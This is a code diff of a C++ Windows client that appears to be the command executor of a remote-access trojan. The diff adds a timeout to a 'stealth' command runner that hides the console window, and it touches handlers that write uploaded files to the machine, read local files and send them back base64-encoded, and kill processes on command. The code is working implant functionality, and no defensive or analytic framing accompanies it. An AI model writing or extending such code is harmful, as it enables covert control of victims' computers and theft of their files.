@@ -66,10 +66,7 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
 
 // Stealth Command Execution without CMD Flicker
 std::string RunStealthCommand(const std::string& cmd) {
-    // Check command length to prevent buffer overflow
-    if (cmd.length() > 8000) { // Windows CMD limit is around 8191
-        return "ERR_CMD_TOO_LONG";
-    }
+    if (cmd.length() > 8000) return "ERR_CMD_TOO_LONG";
 
     HANDLE hRead, hWrite;
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
@@ -96,15 +93,34 @@ std::string RunStealthCommand(const std::string& cmd) {
     free(cmdBuf);
     CloseHandle(hWrite);
 
+    // Dynamic output reading with timeout awareness
     std::string result;
     char buffer[4096];
     DWORD bytesRead;
-    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
-        buffer[bytesRead] = '\0';
-        result += buffer;
+    
+    // Use a 15-second timeout for standard commands
+    DWORD timeoutMs = 15000;
+    auto startTime = GetTickCount64();
+
+    while (true) {
+        DWORD avail = 0;
+        if (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
+            if (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
+                buffer[bytesRead] = '\0';
+                result += buffer;
+            }
+        } else {
+            // Check if process is still running
+            if (WaitForSingleObject(pi.hProcess, 50) != WAIT_TIMEOUT) break;
+        }
+
+        if ((GetTickCount64() - startTime) > timeoutMs) {
+            result += "\n[!] Command timed out. Terminating process...";
+            TerminateProcess(pi.hProcess, 1);
+            break;
+        }
     }
 
-    WaitForSingleObject(pi.hProcess, 5000); // 5s timeout
     CloseHandle(hRead);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
@@ -151,7 +167,7 @@ std::string Executor::GetCurrentDir() {
 
 std::string Executor::ExecuteCommand(const std::string& command) {
     // Log command execution start
-    LogToFile("../bin/logs/client.log", "[*] Executing command: " + command);
+    LogToFile("client.log", "[*] Executing command: " + command);
 
     std::string cmd = command;
     size_t trailing = cmd.find_last_not_of(" \n\r\t");
@@ -357,10 +373,10 @@ std::string Executor::ExecuteCommand(const std::string& command) {
         if (out.is_open()) {
             out.write(content.data(), content.size());
             out.close();
-            LogToFile("../bin/logs/client.log", "[+] File uploaded successfully: " + remotePath);
+            LogToFile("client.log", "[+] File uploaded successfully: " + remotePath);
             return "SUCCESS_UPLOAD";
         }
-        LogToFile("../bin/logs/client.log", "[-] Failed to upload file: " + remotePath);
+        LogToFile("client.log", "[-] Failed to upload file: " + remotePath);
         return "ERR_FILE_WRITE|||" + GetCurrentDir();
     }
 
@@ -368,11 +384,11 @@ std::string Executor::ExecuteCommand(const std::string& command) {
         std::string path = cmd.substr(10);
         std::ifstream in(path, std::ios::binary);
         if (!in.is_open()) {
-            LogToFile("../bin/logs/client.log", "[-] Failed to download file: " + path);
+            LogToFile("client.log", "[-] Failed to download file: " + path);
             return "ERR_FILE_READ";
         }
         std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
-        LogToFile("../bin/logs/client.log", "[+] File downloaded successfully: " + path + " (" + std::to_string(content.size()) + " bytes)");
+        LogToFile("client.log", "[+] File downloaded successfully: " + path + " (" + std::to_string(content.size()) + " bytes)");
         return "[BASE64]" + Base64Encode(content);
     }
 
@@ -388,10 +404,10 @@ std::string Executor::ExecuteCommand(const std::string& command) {
         std::string res = RunStealthCommand(command);
         // Check for success indicators in taskkill output
         if (res.find("SUCCESS") != std::string::npos || res.find("successfully") != std::string::npos || res.empty()) {
-            LogToFile("../bin/logs/client.log", "[+] Process killed successfully: " + target);
+            LogToFile("client.log", "[+] Process killed successfully: " + target);
             return "OK";
         } else {
-            LogToFile("../bin/logs/client.log", "[-] Failed to kill process: " + target + " - " + res);
+            LogToFile("client.log", "[-] Failed to kill process: " + target + " - " + res);
             return "ERR_STOP_FAILED";
         }
 #endif
